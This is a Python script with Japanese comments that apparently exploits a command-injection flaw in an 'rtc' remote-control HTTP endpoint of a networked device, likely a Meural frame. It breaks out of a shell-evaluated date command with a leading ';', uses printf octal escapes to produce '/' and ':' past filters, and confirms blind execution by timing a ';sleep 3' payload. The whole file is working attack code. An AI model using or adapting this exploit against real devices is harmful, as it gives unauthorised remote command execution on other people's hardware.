#!/usr/bin/env python3
"""rtc_shell v2: 実行コンテキストが
sh -c 'eval date -s @<PAYLOAD>' 相当である事実に合わせ、
payload先頭に ';' を置いてdateコンテキストから脱出するのが正解。
"""

import os
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = os.environ.get("MEURAL_HOST", "192.0.2.10")
URL_TMPL = f"http://{HOST}/remote/control_command/rtc/%s/"


def wrap(cmd: str) -> str:
    return urllib.parse.quote(cmd, safe="")


def rtc(cmd: str, timeout: float = 90.0) -> tuple[str, float]:
    url = URL_TMPL % wrap(cmd)
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = f"HTTP {e.code}: {e.read().decode(errors='replace')[:160]}"
    return body, time.monotonic() - t0


# payloadスタンドards: ';' でdateから脱出 → 変数s(=/)とc=(:)を設定
INIT = ";s=$(printf '\\057');c=$(printf '\\072')"


def step(name: str, payload: str, wait: float = 0.0, timeout: float = 90.0) -> float:
    body, dt = rtc(payload, timeout)
    tag = "MATCH" if wait and dt > wait * 0.7 else ("run" if wait else "")
    print(f"{name:30s} delay={dt:6.2f}s {tag} body={body[:60]!r}")
    return dt


if __name__ == "__main__":
    # サニティ: ; プレフィックスで sleep が効くか
    step("semi-sleep3", ";sleep 3", wait=3.0)
